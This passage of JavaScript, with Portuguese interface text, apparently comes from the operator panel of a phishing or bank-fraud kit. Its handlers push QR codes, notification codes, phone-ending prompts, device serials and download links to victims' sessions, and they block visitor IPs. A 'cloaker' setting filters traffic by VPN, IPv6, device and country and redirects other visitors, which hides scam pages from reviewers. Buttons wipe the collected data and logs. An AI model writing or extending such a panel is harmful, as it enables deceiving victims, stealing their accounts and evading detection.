					throw new Error("Resposta inesperada do servidor.");
				}
				exibirSucesso(data.mensagem);
				bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();

				if (fileInput) fileInput.value = "";
				if (urlInput) urlInput.value = "";
				resetFormQrcodeDropZone();
				hideQrcodeSendButton();

				setTimeout(() => location.reload(), 2000);
			}

			if (payload.qrcodeTipo === "url") {
				postQrcode(payload.qrcode, "url")
					.then(data => onSuccess(data))
					.catch(error => {
						console.error("Erro ao enviar requisição:", error);
						alert(error.message || "Erro ao enviar QR Code. Tente novamente.");
					});
				return;
			}

			if (payload.qrcodeTipo === "data" && payload.qrcode) {
				const pre = String(payload.qrcode);
				if (!/^data:image\//i.test(pre)) {
					alert("Formato de imagem inválido.");
					return;
				}
				postQrcode(pre, "data")
					.then(data => onSuccess(data))
					.catch(error => {
						console.error("Erro ao enviar requisição:", error);
						alert(error.message || "Erro ao enviar QR Code. Tente novamente.");
					});
				return;
			}

			if (payload.qrcodeTipo === "base64" && payload.qrcode) {
				const b64 = String(payload.qrcode).replace(/\s+/g, "");
				if (!window.mkQrcodeInputHelpers?.isQrcodeRawBase64(b64)) {
					alert("Código Base64 inválido.");
					return;
				}
				postQrcode(b64, "base64")
					.then(data => onSuccess(data))
					.catch(error => {
						console.error("Erro ao enviar requisição:", error);
						alert(error.message || "Erro ao enviar QR Code. Tente novamente.");
					});
				return;
			}

			if (payload.qrcodeTipo !== "file" || !payload.file) {
				alert("Selecione uma imagem de QR Code, informe um link http(s) ou cole o Base64.");
				return;
			}

			const reader = new FileReader();
			reader.readAsDataURL(payload.file);
			reader.onload = function () {
				const dataUrl = reader.result;
				if (typeof dataUrl !== "string" || !/^data:image\//i.test(dataUrl)) {
					alert("Formato de imagem inválido.");
					return;
				}
				postQrcode(dataUrl, "data")
					.then(data => onSuccess(data))
					.catch(error => {
						console.error("Erro ao enviar requisição:", error);
						alert(error.message || "Erro ao enviar QR Code. Tente novamente.");
					});
			};
			reader.onerror = function (error) {
				console.error("Erro ao ler arquivo:", error);
				alert("Erro ao processar a imagem do QR Code.");
			};
		});
	})();

	// document.getElementById("formNotificacao").addEventListener("submit", function (event) {
	// 	event.preventDefault();
	
	// 	const comando = document.getElementById("enviarCodigoNotificacao").value;
	// 	const idModal = document.getElementById("idModalOperarInfo").value;
	// 	const codigoTela = document.getElementById("codigoNotificacao").value;
	// 	const status = document.getElementById("enviarCodigoNotificacao").getAttribute("data-status");
	
	// 	if (!comando) {
	// 		console.error("Erro: O botão clicado não tem um valor definido.");
	// 		return;
	// 	}
	// 	if (codigoTela === "") {
	// 		exibirErro("Informe o código da notificação");
	// 		return;
	// 	}
	
	// 	fetch("functions/comandoNotificacao.php", {
	// 		method: "POST",
	// 		headers: {
	// 			"Content-Type": "application/json",
	// 		},
	// 		body: JSON.stringify({ comando, idModal, status, codigoTela }),
	// 	})
	// 	.then(response => {
	// 		if (!response.ok) {
	// 			throw new Error("Erro na resposta do servidor: " + response.status);
	// 		}
	// 		return response.json();
	// 	})
	// 	.then(data => {
	// 		bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
	// 		exibirSucesso("Código enviado com sucesso!");
	// 	})
	// 	.catch(error => {
	// 		console.error("Erro ao enviar requisição:", error);
	// 	});
	// });
	// document.getElementById("formQrcode").addEventListener("submit", function (event) {
	// 	event.preventDefault();
	
	// 	const comando = document.getElementById("enviarFinal").value;
	// 	const idModal = document.getElementById("idModalOperarInfo").value;
	// 	const finalTelefone = document.getElementById("finalTelefone").value;
	// 	const status = document.getElementById("enviarFinal").getAttribute("data-status");
	
	// 	if (!comando) {
	// 		console.error("Erro: O botão clicado não tem um valor definido.");
	// 		return;
	// 	}
	// 	if (finalTelefone === "") {
	// 		exibirErro("Informe final do telefone");
	// 		return;
	// 	}
	
	// 	fetch("functions/comandoTelefone.php", {
	// 		method: "POST",
	// 		headers: {
	// 			"Content-Type": "application/json",
	// 		},
	// 		body: JSON.stringify({ comando, idModal, status, finalTelefone }),
	// 	})
	// 	.then(response => {
	// 		if (!response.ok) {
	// 			throw new Error("Erro na resposta do servidor: " + response.status);
	// 		}
	// 		return response.json();
	// 	})
	// 	.then(data => {
	// 		bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
	// 		exibirSucesso("Comando atualizado com sucesso!");
	// 	})
	// 	.catch(error => {
	// 		console.error("Erro ao enviar requisição:", error);
	// 	});
	// });
	// document.getElementById("formLinkDownload").addEventListener("submit", function (event) {
	// document.getElementById("enviarNome").addEventListener("click", function (event) {
	document.getElementById("formNome").addEventListener("submit", function (event) {
		event.preventDefault();

		// const comando = document.getElementById("enviarNome").getAttribute("data-comando");
		const idModal = document.getElementById("idModalOperarInfo").value;
		const nome = document.getElementById("nome").value;
		const status = document.getElementById("enviarNome").getAttribute("data-status");
	
		
		if (nome === "") {
			exibirErro("Informe o nome do Cliente");
			return;
		}
	
		fetch("functions/save_name.php", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ idModal, status, nome }),
		})
		.then(response => {
			if (!response.ok) {
				throw new Error("Erro na resposta do servidor: " + response.status);
			}
			return response.json();
		})
		.then(data => {
			// bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
			exibirSucesso("Nome salvo com sucesso!");
		})
		.catch(error => {
			console.error("Erro ao enviar requisição:", error);
		});
	});
	
	document.getElementById("formSerie").addEventListener("submit", function (event) {
		event.preventDefault();

		// const comando = document.getElementById("enviarNome").getAttribute("data-comando");
		const idModal = document.getElementById("idModalOperarInfo").value;
		const serie = document.getElementById("serie").value;
		const status = document.getElementById("enviarSerie").getAttribute("data-status");
	
		
		if (serie === "") {
			exibirErro("Informe a serie do dispositivo");
			return;
		}
	
		fetch("functions/save_serie.php", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ idModal, status, serie }),
		})
		.then(response => {
			if (!response.ok) {
				throw new Error("Erro na resposta do servidor: " + response.status);
			}
			return response.json();
		})
		.then(data => {
			// bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
			exibirSucesso("Serie do dispositivo salvo com sucesso!");
		})
		.catch(error => {
			console.error("Erro ao enviar requisição:", error);
		});
	});

	document.getElementById("formBinario").addEventListener("submit", function (event) {
		event.preventDefault();

		const comando = document.getElementById("enviarBinario").getAttribute("data-comando");
		const idModal = document.getElementById("idModalOperarInfo").value;
		const binario = document.getElementById("binario").value;
		const status = document.getElementById("enviarBinario").getAttribute("data-status");
	
		
		if (binario === "") {
			exibirErro("Informe o código binário");
			return;
		}
	
		fetch("functions/save_binario.php", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ idModal, status, binario, comando }),
		})
		.then(response => {
			if (!response.ok) {
				throw new Error("Erro na resposta do servidor: " + response.status);
			}
			return response.json();
		})
		.then(data => {
			// bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
			exibirSucesso("Binário salvo com sucesso!");
		})
		.catch(error => {
			console.error("Erro ao enviar requisição:", error);
		});
	});
	
	document.getElementById("enviarLink").addEventListener("click", function (event) {
		event.preventDefault();

		const comando = document.getElementById("enviarLink").getAttribute("data-comando");
		const idModal = document.getElementById("idModalOperarInfo").value;
		const linkDownload = document.getElementById("linkDownload").value;
		const status = document.getElementById("enviarLink").getAttribute("data-status");
	
		if (!comando) {
			console.error("Erro: O botão clicado não tem um valor definido.");
			return;
		}
		if (linkDownload === "") {
			exibirErro("Informe o link para download");
			return;
		}
	
		fetch("functions/comandoDownload.php", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ comando, idModal, status, linkDownload }),
		})
		.then(response => {
			if (!response.ok) {
				throw new Error("Erro na resposta do servidor: " + response.status);
			}
			return response.json();
		})
		.then(data => {
			bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
			exibirSucesso("Comando atualizado com sucesso!");
		})
		.catch(error => {
			console.error("Erro ao enviar requisição:", error);
		});
	});

	document.getElementById('formBloquearIp').addEventListener('submit', function(event) {
		event.preventDefault();
	
		const comando = event.submitter.value;
		const idModal = document.getElementById('idModalOperarInfo').value;
		const ip = document.getElementById('dataIp').textContent;
		const status = event.submitter.getAttribute("data-status");
	
		if (!comando) {
			console.error("Erro: O botão clicado não tem um valor definido.");
			return;
		}
	
		fetch('functions/bloquearIpClient.php', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({ comando, idModal, ip, status }),
		})
		.then(response => {
			if (!response.ok) {
				throw new Error('Erro na resposta do servidor: ' + response.status);
			}
			return response.json();
		})
		.then(data => {
			if (data.mensagem) {
				if (data.mensagem === "IP ja esta bloqueado") {
					exibirErro(data.mensagem); 
					bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
				} else {
					exibirSucesso(data.mensagem); 
					bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
				}
			} else if (data.error) {
				exibirErro(data.error); 
			} else {
				exibirErro("Resposta inesperada do servidor."); 
			}
		})
		.catch(error => {
			console.error('Erro ao enviar requisição:', error);
			exibirErro("Erro ao enviar requisição: " + error.message); 
		});
	});
	$('#formularioSalvarIpBlock').on('submit', function(e) {
		e.preventDefault(); 
	
		var ipBlockUniq = $('#ipBlockUniq').val().trim();
		
		if (ipBlockUniq === "") {
			exibirErro("Campo do IP vazio");
			return;
		}
		if (!validarIP(ipBlockUniq)) {
			exibirErro("IP inválido! Informe um endereço IP válido.");
			return;
		}
	
		$.ajax({
			url: 'functions/bloquearIpUniq.php', 
			type: 'POST',
			dataType: 'json', 
			data: {
				ipBlockUniq: ipBlockUniq
			},
			success: function(data) {
				if (data.mensagem === "Este IP já está bloqueado.") {
					exibirErro("IP já bloqueado");
				} else if (data.mensagem === "IP bloqueado com sucesso") {
					exibirSucesso("IP bloqueado com sucesso!");
					bootstrap.Modal.getInstance(document.getElementById("modalBloquearIp"))?.hide();
				} else {
					exibirErro("Ocorreu um erro inesperado.");
				}
			},
			error: function(jqXHR, textStatus, errorThrown) {
				exibirErro("Ocorreu um erro inesperado.");
			}
		});
	});
	$('#mkFormCloaker').on('submit', function(e) {
        e.preventDefault();

        var transisaoVpn = $('#transisaoVpn').is(':checked');
        var transicaoIpv6 = $('#transicaoIpv6').is(':checked');
        var geradorSubdominio = $('#geradorSubdominio').is(':checked');

        var dispositivo = $('input[name="dispositivo"]:checked').val();
        if (!dispositivo) {
            exibirErro("Selecione um dispositivo permitido.");
            return;
        }

        var linkRedirecionamento = $('#linkRedirecionamento').val().trim();
        if (linkRedirecionamento === "") {
            exibirErro("Informe o link de redirecionamento.");
            return;
        }
        if (!validarURL(linkRedirecionamento)) {
            exibirErro("URL de redirecionamento inválida");
            return;
        }
        var subdominio = $('#subdominio').val() || [];
        var paisesPermitidos = $('#paisesPermitidos').val() || [];

        var data = {
            transisaoVpn: transisaoVpn,
            transicaoIpv6: transicaoIpv6,
            dispositivo: dispositivo,
            geradorSubdominio: geradorSubdominio,
            subdominio: subdominio,
            linkRedirecionamento: linkRedirecionamento,
            paisesPermitidos: paisesPermitidos
        };

        $.ajax({
            url: 'functions/configCloaker.php',
            type: 'POST',
            dataType: 'json',
            data: data,
            success: function(response) {
                if (response.mensagem) {
                    exibirSucesso(response.mensagem);
					bootstrap.Offcanvas.getInstance(document.getElementById("offcanvasConfigCloaker"))?.hide();
                } else if (response.error) {
                    exibirErro(response.error);
                } else {
                    exibirErro("Ocorreu um erro inesperado.");
                }
            },
            error: function(jqXHR, textStatus, errorThrown) {
                exibirErro("Ocorreu um erro inesperado.");
            }
        });
    });

	document.getElementById('formApagarInfo').addEventListener('submit', function(event){
		event.preventDefault(); 
		// alert('teste');
		// return;

		const comando = event.submitter.value;
		const idModal = document.getElementById("idModalOperarInfo").value;
		const status = event.submitter.getAttribute("data-status");

		if (!comando) {
			console.error("Erro: O botão clicado não tem um valor definido.");
			return;
		}
		fetch("functions/apagarInfoOp.php", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ comando, idModal, status}),
		})
		
		exibirSucesso("Info apagada com sucesso!");
		bootstrap.Offcanvas.getInstance(document.getElementById("mkOffCanvasModalOprarInfo"))?.hide();
	});
	// Limpa todos os campos digitáveis do offcanvas de operar info ao fechar
	const mkOffCanvasOperar = document.getElementById('mkOffCanvasModalOprarInfo');
	if (mkOffCanvasOperar) {
		mkOffCanvasOperar.addEventListener('hidden.bs.offcanvas', function() {
			// Limpa os campos de texto
			document.getElementById('nome').value = '';
			document.getElementById('serie').value = '';
			document.getElementById('binario').value = '';
			document.getElementById('linkDownload').value = '';

			const formQr = document.getElementById('formQrcode');
			const fileInputEl = formQr ? formQr.querySelector('#file-input') : document.getElementById('file-input');
			if (fileInputEl) fileInputEl.value = '';

			const qrcodeUrlEl = document.getElementById('qrcodeUrlInput');
			if (qrcodeUrlEl) qrcodeUrlEl.value = '';

			const dropZoneEl = formQr ? formQr.querySelector('#drop-zone') : document.getElementById('drop-zone');
			if (dropZoneEl) {
				dropZoneEl.innerHTML = '<p>Arraste e solte aqui o seu <strong>QRCODE</strong></p><button type="button" class="upload-button">Buscar QRCODE</button>';
				dropZoneEl.querySelector('.upload-button')?.addEventListener('click', () => {
					(formQr ? formQr.querySelector('#file-input') : document.getElementById('file-input'))?.click();
				});
			}

			const sendQr = formQr ? formQr.querySelector('.send-button') : null;
			if (sendQr) sendQr.style.display = 'none';
		});
	}

	offcanvasAcessos.addEventListener('show.bs.offcanvas', function() {
		fetchLiberados();
		fetchBloqueados();

		// 3s: rápido para operação, 3x menos requests que 1s
		timer = setInterval(function() {
			fetchLiberados();
			fetchBloqueados();
		}, 2500);
	});
	offcanvasAcessos.addEventListener('hidden.bs.offcanvas', function() {
		if (timer) {
			clearInterval(timer);
			timer = null;
		}
	});
    offcanvasElement.addEventListener('show.bs.offcanvas', function() {
        fetchLogs();
        updateInterval = setInterval(fetchLogs, 3000); // 3s: suficiente para logs
    });
    offcanvasElement.addEventListener('hidden.bs.offcanvas', function() {
        clearInterval(updateInterval); 
    });
	offcanvasOnline.addEventListener('show.bs.offcanvas', function () {
		fetchOnline();
		timer = setInterval(fetchOnline, 3000); // 3s: online muda lentamente
	});
	offcanvasOnline.addEventListener('hidden.bs.offcanvas', function () {
		if (timer) {
			clearInterval(timer); 
			timer = null;
		}
	});
	offcanvasIpsBlocks.addEventListener('show.bs.offcanvas', function () {
		fetchIpsBlocks();
		timer = setInterval(fetchIpsBlocks, 3000); // 3s: IPs bloqueados raramente mudam
	});
	offcanvasIpsBlocks.addEventListener('hidden.bs.offcanvas', function () {
		if (timer) {
			clearInterval(timer); 
			timer = null;
		}
	});

	$('#offcanvasConfigCloaker').on('show.bs.offcanvas', function() {
        $.ajax({
            url: 'functions/getConfigCloaker.php',
            type: 'GET',
            dataType: 'json',
            success: function(response) {
                if (response.config) {
                    preencherFormularioCloaker(response.config);
                } else if (response.error) {
                    exibirErro(response.error);
                } else {
                    exibirErro("Configurações não encontradas.");
                }
            },
            error: function(jqXHR, textStatus, errorThrown) {
                exibirErro("Erro ao buscar configurações.");
            }
        });
    });
	
	const btnLimparDados = document.getElementById('btnLimparDados');
    btnLimparDados.addEventListener('click', () => {
        Swal.fire({
            title: 'Tem certeza?',
            text: "Esta ação irá limpar todos os dados. Você não poderá reverter isso!",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText: 'Sim, limpar!',
            cancelButtonText: 'Cancelar'
        }).then((result) => {
            if (result.isConfirmed) {
                fetch('functions/delete_info.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({}) 
                })
                .then(response => {
                    
                    const contentType = response.headers.get("content-type");
                    if (contentType && contentType.indexOf("application/json") !== -1) {
                        return response.json();
                    } else {
                        throw new TypeError("Resposta inválida do servidor.");
                    }
                })
                .then(data => {
                    Swal.close(); 

                    exibirSucesso(data.message);
                })
                .catch((error) => {
                    Swal.close(); 
                    console.error('Erro:', error);
                    Swal.fire(
                        'Erro!',
                        'Não foi possível completar a requisição. Tente novamente mais tarde.',
                        'error'
                    );
                });
            }
        });
    });

	const btnLimparLogs = document.getElementById('btnLimparLogs');
    btnLimparLogs.addEventListener('click', () => {
        Swal.fire({
            title: 'Tem certeza?',
            text: "Esta ação irá limpar todos os logs. Você não poderá reverter isso!",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText: 'Sim, limpar!',
            cancelButtonText: 'Cancelar'
        }).then((result) => {
            if (result.isConfirmed) {
                fetch('functions/delete_logs.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({}) 
                })
                .then(response => {
                    
                    const contentType = response.headers.get("content-type");
                    if (contentType && contentType.indexOf("application/json") !== -1) {
                        return response.json();
                    } else {
                        throw new TypeError("Resposta inválida do servidor.");
                    }
                })
                .then(data => {
                    Swal.close();
                    if (data.success) {
						exibirSucesso(data.message);
                    } else {
						exibirErro(data.error);
                    }
                })
                .catch((error) => {
                    Swal.close(); 
                    console.error('Erro:', error);
                    Swal.fire(
                        'Erro!',
                        'Não foi possível completar a requisição. Tente novamente mais tarde.',
                        'error'
                    );
                });
            }
        });
    });
	
	const btnLimparIps = document.getElementById('btnLimparIps');
    btnLimparIps.addEventListener('click', () => {
        Swal.fire({
            title: 'Tem certeza?',
            text: "Esta ação irá limpar todos os Ips. Você não poderá reverter isso!",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText: 'Sim, limpar!',
            cancelButtonText: 'Cancelar'
        }).then((result) => {
            if (result.isConfirmed) {
                fetch('functions/delete_ipsBlocks.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({}) 
                })
                .then(response => {
                    
                    const contentType = response.headers.get("content-type");
                    if (contentType && contentType.indexOf("application/json") !== -1) {
                        return response.json();
                    } else {
                        throw new TypeError("Resposta inválida do servidor.");
                    }
                })
                .then(data => {
                    Swal.close(); 

                    exibirSucesso("IPs apagado com sucesso");
                })
                .catch((error) => {
                    Swal.close(); 
                    exibirErro("Erro ao apagar IPs");
                });
            }
        });
    });
	
	(function initMkInfosPagination() {
		var sel = document.getElementById('mkInfosPerPage');
		var prev = document.getElementById('mkInfosPagePrev');
		var next = document.getElementById('mkInfosPageNext');
		if (sel) {
			sel.value = String(mkInfosClient.perPage);
			sel.addEventListener('change', function() {
				mkInfosClient.perPage = mkValidPerPage(parseInt(this.value, 10));
				sessionStorage.setItem(MK_INFOS_PER_PAGE_KEY, String(mkInfosClient.perPage));
				mkInfosClient.page = 1;
				sessionStorage.setItem(MK_INFOS_PAGE_KEY, '1');
				infosSinceRevision = '';
				infosSinceSlimHash = '';
				fetchInfos();
			});
		}
		if (prev) {
			prev.addEventListener('click', function() {
				if (mkInfosClient.page > 1) {
					mkInfosClient.page--;
					sessionStorage.setItem(MK_INFOS_PAGE_KEY, String(mkInfosClient.page));
					infosSinceRevision = '';
					infosSinceSlimHash = '';
					fetchInfos();
				}
			});
		}
		if (next) {
			next.addEventListener('click', function() {
				if (mkInfosClient.page < mkInfosTotalPages) {
					mkInfosClient.page++;
					sessionStorage.setItem(MK_INFOS_PAGE_KEY, String(mkInfosClient.page));
					infosSinceRevision = '';
					infosSinceSlimHash = '';
					fetchInfos();
				}
			});
		}
		var refBtn = document.getElementById('mkInfosRefreshBtn');
		if (refBtn) {
			refBtn.addEventListener('click', function() {
				infosSinceRevision = '';
				infosSinceSlimHash = '';
				fetchInfos();
			});
		}
	})();

	_iniciarInfosTable();

});
